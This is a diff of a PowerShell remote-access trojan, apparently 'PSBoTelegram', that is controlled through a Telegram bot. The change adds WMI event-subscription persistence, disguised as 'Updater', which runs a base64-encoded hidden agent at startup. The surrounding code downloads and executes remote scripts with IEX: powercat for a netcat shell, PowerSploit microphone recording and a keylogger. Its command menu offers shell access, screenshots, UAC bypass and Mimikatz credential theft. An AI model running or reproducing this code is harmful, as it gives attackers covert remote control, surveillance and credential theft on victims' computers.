@@ -4,9 +4,10 @@ function create_agent {param ($botkey,$chat_id)
 $agent_bot = '[string]$botkey = "your_token";[string]$bot_Master_ID = "your_chat_id";[int]$delay = "your_delay";IEX (Invoke-WebRequest "https://raw.githubusercontent.com/hackplayers/psbotelegram/master/Functions.ps1").content;$chat_id = $bot_Master_ID ; $getMeLink = "https://api.telegram.org/bot$botkey/getMe" ; $bot = $getMeLink -split "/" ;$bot = [string]$bot[3];$getUpdatesLink = "https://api.telegram.org/bot$botkey/getUpdates";[int]$first_connect = "1";while($true) { $json = Invoke-WebRequest -Uri $getUpdatesLink -Body @{offset=$offset} | ConvertFrom-Json;$l = $json.result.length;$i = 0;if ($first_connect -eq 1) {$texto = "$env:COMPUTERNAME connected con bypassuac :D"; envia-mensaje -text $texto -chat $chat_id -botkey $botkey; $first_connect = $first_connect + 1};while ($i -lt $l) {$offset = $json.result[$i].update_id + 1; $comando = $json.result[$i].message.text;test-command -comando $comando -botkey $botkey -chat_id $chat_id -first_connect $first_connect;$i++} ;Start-Sleep -s $delay ;$first_connect++ }' ; $agent_bot = $agent_bot -replace "your_token", "$botkey" -replace "your_chat_id", "$chat_id" -replace "your_delay", "1" ; return $agent_bot}
 
 
+
 ################################################ Cargamos funciones de otros proyectos ########################################################################
 
-IEX (curl "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-MicrophoneAudio.ps1").content #### Grabar Audio
+
 $powercat = (curl "https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1").content -replace "function powercat","function nc" ; IEX $powercat ### Netcat
 #IEX (curl "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1").content  ### Keylogger
 
@@ -137,6 +138,7 @@ bot-send -photo $ruta -botkey $botkey -chat_id $chat_id
 }
 
 function graba-audio { param ($botkey,$chat_id,$segundos)
+IEX (curl "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-MicrophoneAudio.ps1").content #### Grabar Audio
 $ruta = $env:USERPROFILE + "\AppData\Local\temp\1"
 $audio = $ruta + "\" + "audio.wav"
 if ( (Test-Path $ruta) -eq $false) {mkdir $ruta} else {}
@@ -172,8 +174,27 @@ bot-send -file $ruta -botkey $botkey -chat_id $chat_id
 Remove-Item $ruta_ps1 ; sleep -Seconds 5 ; Remove-Item $ruta
 }
 
+function persistence {
+If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
+{write-host "Sorry, necesitas privilegios"; break }  else {
+$agent_bot = create_agent
+$code =[system.convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($agent_bot))
+Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{name='Updater';EventNameSpace='root\CimV2';QueryLanguage="WQL";Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"};$Consumer=Set-WmiInstance -Namespace "root\subscription" -Class 'CommandLineEventConsumer' -Arguments @{ name='Updater';CommandLineTemplate="$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -win hidden -enc $code";RunInteractively='false'};Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{Filter=$Filter;Consumer=$Consumer} | Out-Null
+write-host "Persistencia ejecutada correctamente"}
+}
+
+function remove-persistence {
+If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
+{write-host "Sorry, necesitas privilegios"; break }  
+else {
+$comando = (Get-WmiObject commandlineeventconsumer -Namespace root\subscription -Filter "name='UPDATER'").CommandLineTemplate
+if ($comando -eq $null -or $comando -eq "") {Write-Host Todo correcto! parece estar limpio el arranque.} else {
+Write-Host Estas hackeado!!! Encontrado hack en su arranque: `n`n$comando`n Eliminando persistencia
+Get-WmiObject commandlineeventconsumer -Namespace root\subscription -Filter "name='Updater'" | Remove-WmiObject
+}}}
+
 function test-command {param ($comando="",$botkey="",$chat_id="",$first_connect="") 
- $help = "PSBoTelegram V0.5`n`nComandos disponibles :`n[*] /Help`n[*] /Info`n[*] /Shell`n[*] /whoami`n[*] /Ippublic`n[*] /Kill`n[*] /Scriptimport`n[*] /Shell nc (NETCAT)`n[*] /Download`n[*] /Screenshot`n[*] /Audio`n[*] /BypassUAC`n[*] /Persistence`n[*] /MimiGatoz"
+ $help = "PSBoTelegram V0.5`n`nComandos disponibles :`n[*] /Help`n[*] /Info`n[*] /Shell`n[*] /whoami`n[*] /Ippublic`n[*] /Kill`n[*] /Scriptimport`n[*] /Shell nc (NETCAT)`n[*] /Download`n[*] /Screenshot`n[*] /Audio`n[*] /BypassUAC`n[*] /Persistence`n[*] /Remove-Persistence`n[*] /MimiGatoz"
  if ($comando -like "/Help") {$texto = $help; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
  if ($comando -like "Hola") {$texto = "Hola cabeshaa !! :D"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id }
  if ($comando -like "/Info") {$texto = get-info | Out-String ;envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
@@ -187,7 +208,9 @@ function test-command {param ($comando="",$botkey="",$chat_id="",$first_connect=
  if ($chat_id -eq $null -or $chat_id -eq "") {$chat_id = (bot-public).chat_id}
  if ($comando -like "/Audio*") {$segundos = $comando -replace "/Audio ","";graba-audio -botkey $botkey -chat_id $chat_id -segundos $segundos}
  if ($comando -like "/Bypassuac" -and $first_connect -gt 5) {$texto = "Ejecutado el BypassUAC, espere la nueva conexion del BOT";envia-mensaje -text $texto -botkey $botkey -chat $chat_id; $id = (Get-Process powershell).Id;$agent_bot = create_agent -botkey $botkey -chat_id $chat_id; BypassUAC-CyberVaca -comando $agent_bot ;  Stop-Process -id $id}
- if ($comando -like "/Persistence*") {$texto = "Proximamente."; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
+ if ($comando -like "/Persistence") {$texto = "La funcion de persistencia se ejecuta: `n /Persistence On`n /Persistence Off"; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
+ if ($comando -like "/Persistence On") {persistence; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
+ if ($comando -like "/Persistence Off") {remove-persistence; envia-mensaje -text $texto -botkey $botkey -chat $chat_id}
  if ($comando -like "/MimiGatoz") {mimigatoz}
 
 }
